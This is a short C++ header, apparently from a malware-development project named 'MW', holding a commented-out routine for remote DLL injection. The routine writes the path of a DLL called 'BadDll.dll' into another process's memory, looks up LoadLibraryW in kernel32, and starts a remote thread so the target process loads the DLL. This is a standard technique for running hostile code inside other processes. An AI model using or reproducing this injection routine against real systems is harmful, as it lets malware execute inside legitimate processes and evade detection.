#pragma once
import Helpers;
#include "Process.h"
#include <string>
#include <Windows.h>
#include "AllocateWrite.hpp"

//namespace MW::Inject
//{
//    void CodeInjectionDLL(const Process &proc)
//    {
//        // Get the path of the DLL to inject
//        std::string dllPath{ Helpers::GetDllPathWorkingDirectory("BadDll.dll") };
//
//        // Reserve space for the DLL path length
//        // Write the DLL path into the process memory
//        LPVOID remoteBuffer{ MW::Inject::AllocateAndWriteMemory(proc, dllPath, dllPath.length()) };
//
//        // Get injector process' Kernel32.dll -> LoadLibrary address (Kernel32 has the same base address in every process so this works)
//        HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
//        PAPCFUNC pLoadLibrary = (PAPCFUNC)GetProcAddress(hKernel32, "LoadLibraryW");
//
//        // Create thread and execute the DLL load
//        CreateRemoteThreadAndExecuteCode(pLoadLibrary, proc, remoteBuffer);
//    }
//}